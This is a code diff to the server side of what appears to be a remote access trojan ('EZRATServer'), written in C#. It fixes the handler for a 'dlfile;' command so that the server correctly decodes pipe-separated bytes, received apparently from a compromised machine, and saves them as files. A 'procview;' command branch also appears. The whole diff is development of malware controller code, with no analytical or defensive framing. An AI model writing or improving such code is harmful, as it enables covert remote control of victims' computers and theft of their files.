@@ -680,11 +680,10 @@ namespace EZRATServer
                     }
                     else if (text.StartsWith("dlfile;"))
                     {
-                        text = text.Substring(6);
-                        byte[] recFile = Encoding.Default.GetBytes(text);
+                        text = text.Substring(7);
                         string path = Environment.CurrentDirectory;
                         this.fl.Invoke(new MethodInvoker(() => path += "\\Files" + this.fl.PathDownload.Substring(this.fl.PathDownload.LastIndexOf('\\'))));
-                        ReceiveFile(recFile, path);
+                        ReceiveFile(text, path);
                     }
                     else if (text.StartsWith("procview;"))
                     {
@@ -764,16 +763,21 @@ namespace EZRATServer
         }
 
 
-        private void ReceiveFile(byte[] data, string path)
+        private void ReceiveFile(string data, string path)
         {
 
-
+            string[] textValue = data.Split('|');
+            byte[] fileData = new byte[textValue.Length];
+            for (int i = 0; i < textValue.Length - 1; i++)
+            {
+                fileData[i] = Convert.ToByte(textValue[i]);
+            }
             string dir = path.Substring(0, path.LastIndexOf('\\'));
             if (!Directory.Exists(dir))
             {
                 Directory.CreateDirectory(dir);
             }
-            File.WriteAllBytes(path, data);
+            File.WriteAllBytes(path, fileData);
 
         }
 
